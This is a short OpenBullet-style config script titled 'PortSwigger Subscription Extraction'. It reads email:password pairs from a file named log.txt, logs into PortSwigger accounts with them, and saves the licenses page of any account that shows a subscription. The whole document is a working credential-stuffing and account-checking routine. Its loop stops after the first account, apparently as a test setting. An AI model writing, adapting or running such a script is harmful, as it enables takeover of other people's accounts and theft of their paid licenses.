## PortSwigger Subscription Extraction - SvbScript
## Reads accounts from log.txt and extracts licenses page HTML

FileReadLines "Configs\log.txt" -> VAR "accounts"
PRINT "Loaded accounts" White

SET VAR "counter" "0" Integer
SET VAR "success_count" "0" Integer

FOREACH $"<accounts>" -> VAR "account"

  SUM $"<counter>" 1 -> VAR "counter"

  IF $"<counter>" GreaterThan "1"
    BREAK
  ENDIF

  Split $"<account>" ":" -> VAR "creds"
  SET VAR "email" $"<creds[0]>"
  SET VAR "password" $"<creds[1]>"

  PRINT "About to make request" White

  ## Step 1: GET login page with shorter timeout
  HttpRequest GET "https://login.portswigger.net/u/login" ReadResponseSource=True
    TIMEOUT 10000
    -> VAR "loginPageRes"

  PRINT "Step 1 done" White

  ## Step 2: POST credentials with email/password
  ConstantString "username=" -> VAR "postData"
  Append $"<postData>" $"<email>" -> VAR "postData"
  Append $"<postData>" "&password=" -> VAR "postData"
  Append $"<postData>" $"<password>" -> VAR "postData"
  Append $"<postData>" "&action=default" -> VAR "postData"

  HttpRequest POST "https://login.portswigger.net/u/login" ReadResponseSource=True
    CONTENT $"<postData>"
    CONTENTTYPE "application/x-www-form-urlencoded"
    TIMEOUT 10000
    -> VAR "loginRes"

  PRINT "Step 2 done" White

  ## Step 3: GET licenses page
  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" ReadResponseSource=True
    TIMEOUT 10000
    -> VAR "licensesRes"

  PRINT "Step 3 done" White

  ## Check if successful
  IF $"<licensesRes>" Contains "subscription"
    PRINT "Success found" Green

    ConstantString "Configs\extraction_results\test.html" -> VAR "htmlFile"
    StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
    FileWriteBytes $"<htmlFile>" $"<htmlBytes>"

    SUM $"<success_count>" 1 -> VAR "success_count"
  ELSE
    PRINT "No subscription" Red
  ENDIF

  Delay 500

ENDFOREACH

PRINT "Done" White
